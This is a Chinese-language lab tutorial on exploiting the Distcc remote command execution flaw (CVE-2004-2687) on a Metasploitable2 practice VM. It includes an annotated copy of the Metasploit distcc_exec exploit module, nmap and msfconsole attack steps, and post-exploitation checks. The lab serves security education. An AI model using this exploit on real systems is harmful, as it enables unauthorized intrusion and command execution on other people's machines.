# 攻击 Distcc 获取权限

## 一、实验简介

### 1.1 实验介绍

本实验在实验楼的 Kali 终端下进行，对实验楼提供的目标靶机 Metasploitable2 的 Distcc 服务进行渗透扫描和攻击。重点介绍 Distcc  的攻击原理和流程，实验末尾留有相应的推荐阅读和课后作业。

**注意：实验用的云主机因为配置成本较高，会限制次数，每个实验不超过6次**

### 1.2 实验知识点

实验通过对实验楼目标靶机进行扫描，找到漏洞 `Distcc` 服务，并选择相应的模块进行渗透攻击。本实验的主要知识点如下：

- Distcc 漏洞原理
- Nmap 渗透扫描基础
- Metasploit 攻击 Distcc 流程
- 渗透成功后验证

### 1.3 实验环境

实验在实验楼的环境中进行，本实验由实验楼提供两台虚拟机，分别是攻击机和目标靶机。这两台虚拟机的主机名称，主机名，以及 IP 地址分别如下：

| 主机     | 主机名称        | 主机名 | IP 地址         |
| -------- | --------------- | ------ | --------------- |
| 攻击机   | Kali Linux 2.0  | Kali   | 192.168.122.101 |
| 目标靶机 | Metasploitable2 | target | 192.168.122.102 |



![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1480164198416.png-wm)



## 二、环境启动

### 2.1 实验环境启动


首先使用 `virsh list` 命令查看当前环境中虚拟机的列表和状态，注意需要使用 sudo，另外需要加上参数 `--all` 才会显示所有关机状态的虚拟机：


![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479890445878.png-wm)

然后我们使用 `virsh start` 命令启动虚拟机，再次查看状态虚拟机已经进入 running 状态：


![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479890565816.png-wm)

注意由于虚拟机启动需要时间，大概要等四分钟左右我们就可以使用 SSH 访问两台虚拟机了。

首先使用 SSH 连接到 Kali，我们大部分的攻击操作都需要在 Kali 虚拟机中进行，注意用户名root，密码 toor 是不显示的，使用命令 `ssh root@kali` 即可，因为当前实验环境中已经把 IP 地址和主机名的对应写入到了 `/etc/hosts` 文件中，避免输入不好记的 IP 地址：

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479890676283.png-wm)

现在两台实验环境都已经启动，我们可以开始渗透测试实验了。

## 三、 渗透测试

### 3.1 渗透扫描

Distcc 服务漏洞原理：

> Distcc用于将大规模的代码放到网络服务器上的分布式编译，但是如果配置不严格，容易被滥用执行命令，该漏洞是 XCode 1.5 版本及其他版本的 distcc 2.x 版本配署对于服务器端口的访问不限制造成的。

简单的说就是服务对端口和执行的任务检查不够严格，从而造成攻击者可以利用分布式的编译任务执行自己想要执行的命令。

漏洞索引：

+ [CVE-2004-2687](http://www.cvedetails.com/cve/cve-2004-2687)
+ [OSVDB-13378](https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec#)


漏洞攻击模块代码：

+ [exploit/unix/misc/distcc_exec](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/misc/distcc_exec.rb)


漏洞攻击模块代码解析：

```
...

# 创建 Metasploit 攻击模块类
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  
  # 初始化模块，设定攻击模块的名称，描述，作者，License及漏洞索引等信息
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'DistCC Daemon Command Execution',
      'Description'    => %q{
        This module uses a documented security weakness to execute
        arbitrary commands on any system running distccd.
      },
      'Author'         => [ 'hdm' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2004-2687'],
          [ 'OSVDB', '13378' ],
          [ 'URL', 'http://distcc.samba.org/security.html'],

        ],
      'Platform'       => ['unix'],
      'Arch'           => ARCH_CMD,
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'       => 1024,
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd cmd_bash',
              'RequiredCmd' => 'generic perl ruby bash telnet openssl bash-tcp',
            }
        },
      'Targets'        =>
        [
          [ 'Automatic Target', { }]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Feb 01 2002'
      ))

      # 默认的配置参数，攻击目标端口号为3632
      register_options(
        [
          Opt::RPORT(3632)
        ], self.class)
  end

  # 检查函数，用来测试目标主机的服务是否具有漏洞
  # 检查的方法是发送一条echo命令看服务返回的结果，如果有返回结果则说明漏洞存在
  def check
    r = rand_text_alphanumeric(10)
    connect
    sock.put(dist_cmd("sh", "-c", "echo #{r}"))

    dtag = rand_text_alphanumeric(10)
    sock.put("DOTI0000000A#{dtag}\n")

    err, out = read_output
    if out.index(r)
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end

  # 攻击过程
  def exploit
    # 连接目标服务的端口
    connect

    # 构建远程执行的命令，将 payload 放入到执行的脚本中
    distcmd = dist_cmd("sh", "-c", payload.encoded);
    
    # 发送命令到目标服务器
    sock.put(distcmd)
    
    dtag = rand_text_alphanumeric(10)
    sock.put("DOTI0000000A#{dtag}\n")

    # 读取输出信息
    err, out = read_output

    # 判断是 stdout 还是 stderr 然后打印出来
    (err || "").split("\n") do |line|
      print_status("stderr: #{line}")
    end
    (out || "").split("\n") do |line|
      print_status("stdout: #{line}")
    end

    handler
    disconnect
  end

...

end
```



渗透扫描在渗透攻击中，占据着非常重要的角色。黑客在攻击目标主机的时候，第一步所要做的事情，就是收集对方主机的信息，而渗透扫描，就是其中必不可少的一环。

渗透扫描，我们使用扫描神器 Nmap 对即将要渗透的目标主机的端口进行扫描。其中，Nmap (Network Mapper(网络映射器) 是一款开放源代码的网络探测和安全审核的工具。它的设计目标是快速地扫描大型网络，你也可以用它扫描单个主机。

好了，接下来，我们首先在终端中，打开 `postgresql` 服务，在 Kali 终端中，输入命令如下（由于使用 root 登录的 SSH服务，所以可以忽略 sudo）：

```
# 打开 postgresql 服务
sudo service postgresql start

```
![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480000480023.png-wm)


接着在实验楼的 Kali 终端中，输入命令，打开 MSF 终端：

```
# 打开终端 MSF
sudo msfconsole
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479991291836.png-wm)

使用扫描神器 Nmap 对渗透的目标主机，进行扫描：

```
# 使用 nmap 进行扫描
nmap -sV -T4 target
```

![实验楼](https://dn-simplecloud.shiyanlou.com/2120081480231051021-wm)


| 参数  | 参数所代表含义                                               |
| ----- | ------------------------------------------------------------ |
| `-sV` | 扫描目标主机端口，并显示详细端口信息                         |
| `-T4` | 设定 nmap 扫描的时间策略，数字为0-6，越大越快。扫描的越慢则越不容易被发现，也不会给目标带来太大的网络流量 |

根据扫描结果，对所要攻击的端口服务，进行 `search` 模块搜索：

```
# 使用 search 模块对模块进行搜索
# 在实验楼 MFS 终端搜 distcc_exec 这个模块，特别慢，所以直接用自己的 Kali 搜索结果截图给大家看
# 这一步不影响实验，只是为了让实验的同学，更清楚地知道有这么一个过程，search 搜索结果截图如下

search distcc
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480001481635.png-wm)


在 Kali 的 MSF 终端中，使用 `use` 命令，使用相应的模块：

```
# 使用 use 命令对模块进行使用
use exploit/unix/misc/distcc_exec
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1483509242282.png-wm)


接着再使用 `show options` 命令，显示模块参数信息：

```
# 使用命令 show options 查看模块属性名
show options
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480001711639.png-wm)

```
# 利用 set 命令，设置渗透目标主机参数 RHOST 为 192.168.122.102
set RHOST 192.168.122.102
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480002814943.png-wm)



一切就绪后，再使用 `exploit` 进行主机攻击：

```
# 使用命令 exploit 命令，进行渗透攻击
exploit
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1483509502233.png-wm)


# 四、验证渗透攻击

### 4.1 验证渗透是否成功

验证渗透是否成功常用的三个命令：`whoami` 和 `hostname` 以及 ip 地址查看命令：`ifconfig`：

```
# 验证是否成功，查看当前的用户名
whoami

# 由 hostname 查看主机的名字
hostname

# 由 ifconfig 命令查看渗透主机的 ip 地址
ifconfig
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480003230387.png-wm)


由图可知，在输入命令后 `hostname` 以及 ip 地址为 `192.168.122.102`,由显示数据看出，所进行的渗透测试已经成功。


## 五、总结

### 5.1 实验总结

本实验主要介绍了渗透攻击 Distcc  服务的流程。对 Metasploit 的攻击步骤，进一步进行演示，每一个步骤，在实验的讲解中，都配有图片。在学完这个课程后，了解了这些知识点：

- Distcc 漏洞原理
- Nmap 渗透扫描基础
- Metasploit 攻击 Distcc 流程
- 渗透成功后验证方法

## 六、推荐阅读

### 6.1 推荐阅读

Distcc 用于大量代码在网络服务器上的分布式编译，但是如果配置不严格，容易被滥用执行命令，该漏洞是 XCode 1.5 版本及其他版本的 Distcc 2.x 版本配署对于服务器端口的访问不限制。下面为大家收集了 Distcc 的文档，希望大家能够阅读了解，加深对 Distcc 的理解：

> https://wiki.archlinux.org/index.php/Distcc_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)

以及这个，英文（可能要翻墙）：

> https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec


## 七、课后作业

### 7.1 课后作业

实验主要讲述 Distcc 服务漏洞，并通过实验截图，教大家掌握攻击 Distcc 的步骤。在渗透攻击的实验中，只有通过不断地学习，不断地进行实践，才能更好地掌握知识点，希望大家能够完成以下的课后作业：

- 掌握 Kali 漏洞扫描工具 Nmap 的使用
- 掌握 攻击 Distcc 服务流程
- 阅读推荐阅读的课后文档（可选）

对于不懂的问题，都可随时在[实验楼问答](https://www.shiyanlou.com/questions)中提出，与老师和同学一起交流。